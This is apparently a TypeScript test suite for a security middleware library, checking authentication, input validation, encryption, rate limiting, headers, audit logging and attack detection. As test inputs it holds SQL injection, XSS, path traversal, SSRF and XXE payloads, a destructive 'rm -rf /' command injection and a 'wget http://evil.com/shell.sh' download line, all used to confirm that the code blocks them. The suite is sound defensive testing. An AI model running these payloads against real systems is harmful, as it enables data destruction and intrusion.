/**
 * Nuclear-Grade Security Test Suite
 * Comprehensive security testing for all components
 */

import request from 'supertest';
import express, { Application } from 'express';
import { 
  nuclearAuth,
  encryption,
  auditLogger,
  securityMonitor,
  validation,
  rateLimiter,
  securityHeaders,
  prValidationSchemas
} from '../index';
import { z } from 'zod';
import crypto from 'crypto';

describe('Nuclear Security Test Suite', () => {
  let app: Application;
  
  beforeAll(() => {
    // Set up test environment
    process.env.JWT_PRIVATE_KEY = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    }).privateKey;
    
    process.env.JWT_PUBLIC_KEY = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    }).publicKey;
    
    process.env.MASTER_ENCRYPTION_KEY = crypto.randomBytes(32).toString('base64');
    process.env.AUDIT_SIGNING_KEY = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    }).privateKey;
    
    // Set up Express app
    app = express();
    app.use(express.json());
    app.use(securityHeaders.apply());
    
    // Test routes
    app.get('/api/public', (req, res) => {
      res.json({ message: 'Public endpoint' });
    });
    
    app.get('/api/protected', 
      nuclearAuth.authenticate.bind(nuclearAuth),
      (req, res) => {
        res.json({ message: 'Protected endpoint', user: (req as unknown).user });
      }
    );
    
    app.post('/api/pr/operation',
      rateLimiter.prOperations('create'),
      nuclearAuth.authenticate.bind(nuclearAuth),
      nuclearAuth.authorize('pr.operations.create'),
      async (req, res) => {
        const validated = await validation.validate(req.body, prValidationSchemas.createOperation);
        res.json({ message: 'Operation created', data: validated.data });
      }
    );
  });

  describe('Authentication Tests', () => {
    test('Should reject requests without token', async () => {
      const response = await request(app)
        .get('/api/protected')
        .expect(401);
      
      expect(response.body.error).toBe('Authentication failed');
    });
    
    test('Should reject invalid tokens', async () => {
      const response = await request(app)
        .get('/api/protected')
        .set('Authorization', 'Bearer invalid-token')
        .expect(401);
      
      expect(response.body.error).toBe('Authentication failed');
    });
    
    test('Should track failed authentication attempts', async () => {
      // Make multiple failed attempts
      for (let i = 0; i < 4; i++) {
        await request(app)
          .get('/api/protected')
          .set('Authorization', 'Bearer invalid-token');
      }
      
      const response = await request(app)
        .get('/api/protected')
        .set('Authorization', 'Bearer invalid-token')
        .expect(401);
      
      expect(response.body.attempts).toBeGreaterThan(3);
    });
  });

  describe('Input Validation Tests', () => {
    test('Should validate and sanitize string input', () => {
      const dirty = '<script>alert("xss")</script>Hello';
      const clean = validation.sanitizeString(dirty);
      
      expect(clean).toBe('Hello');
      expect(clean).not.toContain('<script>');
    });
    
    test('Should detect SQL injection attempts', async () => {
      const malicious = "'; DROP TABLE users; --";
      const schema = z.object({
        query: z.string()
      });
      
      const result = await validation.validate(
        { query: malicious },
        schema,
        { strict: true }
      );
      
      expect(result.success).toBe(false);
      expect(result.errors?.[0].code).toBe('DANGEROUS_PATTERN');
    });
    
    test('Should validate email addresses', () => {
      const validEmail = validation.validateEmail('test@example.com');
      expect(validEmail.success).toBe(true);
      expect(validEmail.data).toBe('test@example.com');
      
      const invalidEmail = validation.validateEmail('not-an-email');
      expect(invalidEmail.success).toBe(false);
    });
    
    test('Should validate URLs', () => {
      const validUrl = validation.validateUrl('https://example.com/path');
      expect(validUrl.success).toBe(true);
      
      const dangerousUrl = validation.validateUrl('javascript:alert(1)');
      expect(dangerousUrl.success).toBe(false);
      expect(dangerousUrl.errors?.[0].code).toBe('DANGEROUS_URL');
    });
    
    test('Should validate password strength', () => {
      const weakPassword = validation.validatePassword('password123');
      expect(weakPassword.data?.strength).toBeLessThan(80);
      expect(weakPassword.data?.suggestions.length).toBeGreaterThan(0);
      
      const strongPassword = validation.validatePassword('P@ssw0rd!123456');
      expect(strongPassword.data?.strength).toBeGreaterThanOrEqual(80);
      expect(strongPassword.data?.valid).toBe(true);
    });
    
    test('Should validate file uploads', async () => {
      const validFile = await validation.validateFile({
        name: 'document.pdf',
        size: 1024 * 1024, // 1MB
        type: 'application/pdf'
      }, {
        maxSize: 10 * 1024 * 1024,
        allowedTypes: ['application/pdf']
      });
      
      expect(validFile.success).toBe(true);
      
      const invalidFile = await validation.validateFile({
        name: 'virus.exe',
        size: 1024,
        type: 'application/x-executable'
      }, {
        allowedExtensions: ['pdf', 'doc']
      });
      
      expect(invalidFile.success).toBe(false);
      expect(invalidFile.errors?.[0].code).toBe('INVALID_EXTENSION');
    });
  });

  describe('Encryption Tests', () => {
    test('Should encrypt and decrypt data', async () => {
      const plaintext = 'Sensitive data';
      const encrypted = await encryption.encrypt(plaintext);
      
      expect(encrypted).not.toBe(plaintext);
      expect(encrypted.length).toBeGreaterThan(plaintext.length);
      
      const decrypted = await encryption.decrypt(encrypted);
      expect(decrypted).toBe(plaintext);
    });
    
    test('Should use different encryption for each operation', async () => {
      const plaintext = 'Same data';
      const encrypted1 = await encryption.encrypt(plaintext);
      const encrypted2 = await encryption.encrypt(plaintext);
      
      expect(encrypted1).not.toBe(encrypted2);
    });
    
    test('Should handle double encryption', async () => {
      const plaintext = 'Ultra sensitive';
      const encrypted = await encryption.encrypt(plaintext, {
        doubleEncryption: true
      });
      
      const decrypted = await encryption.decrypt(encrypted);
      expect(decrypted).toBe(plaintext);
    });
    
    test('Should generate secure passwords', () => {
      const { password, entropy } = encryption.generateSecurePassword({
        length: 32,
        includeSymbols: true,
        minEntropy: 128
      });
      
      expect(password.length).toBe(32);
      expect(entropy).toBeGreaterThanOrEqual(128);
    });
    
    test('Should perform secure comparison', () => {
      const a = 'secret123';
      const b = 'secret123';
      const c = 'different';
      
      expect(encryption.secureCompare(a, b)).toBe(true);
      expect(encryption.secureCompare(a, c)).toBe(false);
    });
  });

  describe('Rate Limiting Tests', () => {
    test('Should enforce rate limits', async () => {
      const endpoint = '/api/public';
      
      // Make requests up to limit
      for (let i = 0; i < 100; i++) {
        await request(app).get(endpoint);
      }
      
      // Next request should be rate limited
      const response = await request(app)
        .get(endpoint)
        .expect(429);
      
      expect(response.body.error).toBe('Too many requests');
      expect(response.headers['retry-after']).toBeDefined();
    });
    
    test('Should have stricter limits for PR operations', async () => {
      // This would need proper auth setup
      // Just testing the limiter configuration
      const config = rateLimiter['configs']['pr:create_operation'];
      expect(config.points).toBe(5);
      expect(config.duration).toBe(3600);
    });
  });

  describe('Security Headers Tests', () => {
    test('Should set security headers', async () => {
      const response = await request(app).get('/api/public');
      
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });
    
    test('Should include API-specific headers', async () => {
      const apiApp = express();
      apiApp.use(securityHeaders.api());
      apiApp.get('/test', (req, res) => res.json({ ok: true }));
      
      const response = await request(apiApp).get('/test');
      
      expect(response.headers['x-api-version']).toBeDefined();
      expect(response.headers['x-request-id']).toBeDefined();
      expect(response.headers['x-timestamp']).toBeDefined();
    });
  });

  describe('Attack Detection Tests', () => {
    test('Should detect SQL injection', async () => {
      const attack = await securityMonitor.detectAttack({
        method: 'POST',
        path: '/api/search',
        headers: {},
        body: { query: "'; DROP TABLE users; --" },
        ip: '192.168.1.1'
      });
      
      expect(attack.isAttack).toBe(true);
      expect(attack.type).toBe('sql_injection');
      expect(attack.confidence).toBeGreaterThan(0.7);
      expect(attack.action).toBe('block');
    });
    
    test('Should detect XSS attempts', async () => {
      const attack = await securityMonitor.detectAttack({
        method: 'POST',
        path: '/api/comment',
        headers: {},
        body: { 
          comment: '<script>alert("xss")</script>' 
        },
        ip: '192.168.1.1'
      });
      
      expect(attack.isAttack).toBe(true);
      expect(attack.type).toBe('xss');
      expect(attack.action).not.toBe('allow');
    });
    
    test('Should detect path traversal', async () => {
      const attack = await securityMonitor.detectAttack({
        method: 'GET',
        path: '/api/file/../../etc/passwd',
        headers: {},
        ip: '192.168.1.1'
      });
      
      expect(attack.isAttack).toBe(true);
      expect(attack.type).toBe('path_traversal');
      expect(attack.confidence).toBeGreaterThan(0.8);
    });
    
    test('Should detect command injection', async () => {
      const attack = await securityMonitor.detectAttack({
        method: 'POST',
        path: '/api/process',
        headers: {},
        body: { 
          command: 'ls; rm -rf /' 
        },
        ip: '192.168.1.1'
      });
      
      expect(attack.isAttack).toBe(true);
      expect(attack.type).toBe('command_injection');
    });
  });

  describe('Audit Logging Tests', () => {
    test('Should log security events', async () => {
      await auditLogger.logSecurity({
        event: 'test_security_event',
        userId: 'test-user',
        details: { action: 'test' },
        ip: '192.168.1.1'
      });
      
      // Verify integrity can be checked
      const integrity = await auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(true);
      expect(integrity.errors).toHaveLength(0);
    });
    
    test('Should maintain hash chain integrity', async () => {
      // Log multiple events
      for (let i = 0; i < 5; i++) {
        await auditLogger.logAuth({
          action: `test_action_${i}`,
          userId: 'test-user',
          requestId: `req-${i}`
        });
      }
      
      // Force flush
      await auditLogger['flush']();
      
      // Verify chain
      const integrity = await auditLogger.verifyIntegrity();
      expect(integrity.valid).toBe(true);
    });
  });

  describe('Integration Tests', () => {
    test('Should handle complete security flow', async () => {
      // This would test the full security stack
      // 1. Rate limiting
      // 2. Security headers
      // 3. Authentication
      // 4. Authorization
      // 5. Input validation
      // 6. Audit logging
    });
    
    test('Should block suspicious patterns across all inputs', async () => {
      const suspiciousInputs = [
        { sql: "UNION SELECT * FROM users" },
        { xss: "<img src=x onerror=alert(1)>" },
        { cmd: "wget http://evil.com/shell.sh" },
        { path: "../../../etc/shadow" }
      ];
      
      for (const input of suspiciousInputs) {
        const schema = z.object({
          data: z.string()
        });
        
        const result = await validation.validate(
          { data: Object.values(input)[0] },
          schema,
          { strict: true }
        );
        
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Performance Tests', () => {
    test('Encryption should be fast', async () => {
      const data = 'a'.repeat(1000); // 1KB
      const start = Date.now();
      
      for (let i = 0; i < 100; i++) {
        await encryption.encrypt(data);
      }
      
      const duration = Date.now() - start;
      expect(duration).toBeLessThan(1000); // Less than 1 second for 100 operations
    });
    
    test('Validation should be fast', async () => {
      const schema = prValidationSchemas.createOperation;
      const data = {
        objective: 'Test objective for performance testing',
        type: 'grassroots'
      };
      
      const start = Date.now();
      
      for (let i = 0; i < 1000; i++) {
        await validation.validate(data, schema);
      }
      
      const duration = Date.now() - start;
      expect(duration).toBeLessThan(100); // Less than 100ms for 1000 operations
    });
  });
});

describe('Security Vulnerability Tests', () => {
  test('Should prevent timing attacks', () => {
    const correctPassword = 'correct-password';
    const wrongPassword1 = 'wrong-password-1';
    const wrongPassword2 = 'a';
    
    const timings: number[] = [];
    
    // Measure timing for different passwords
    for (let i = 0; i < 100; i++) {
      const start = process.hrtime.bigint();
      encryption.secureCompare(correctPassword, wrongPassword1);
      const end = process.hrtime.bigint();
      timings.push(Number(end - start));
    }
    
    for (let i = 0; i < 100; i++) {
      const start = process.hrtime.bigint();
      encryption.secureCompare(correctPassword, wrongPassword2);
      const end = process.hrtime.bigint();
      timings.push(Number(end - start));
    }
    
    // Calculate variance - should be low for constant-time comparison
    const variance = calculateVariance(timings);
    expect(variance).toBeLessThan(1000000); // Nanoseconds
  });
  
  test('Should prevent SSRF attacks', async () => {
    const ssrfUrls = [
      'http://localhost/admin',
      'http://127.0.0.1:8080',
      'http://[::1]/',
      'http://169.254.169.254/', // AWS metadata
      'file:///etc/passwd',
      'gopher://localhost:8080',
      'dict://localhost:11211'
    ];
    
    for (const url of ssrfUrls) {
      const result = validation.validateUrl(url, {
        protocols: ['https'],
        requireTld: true
      });
      
      expect(result.success).toBe(false);
    }
  });
  
  test('Should prevent XXE attacks', async () => {
    const xxePayloads = [
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>'
    ];
    
    for (const payload of xxePayloads) {
      const result = await validation.validate(
        { xml: payload },
        z.object({ xml: z.string() }),
        { strict: true }
      );
      
      expect(result.success).toBe(false);
    }
  });
});

// Helper functions
function calculateVariance(numbers: number[]): number {
  const mean = numbers.reduce((a, b) => a + b) / numbers.length;
  const squareDiffs = numbers.map(n => Math.pow(n - mean, 2));
  return squareDiffs.reduce((a, b) => a + b) / numbers.length;
}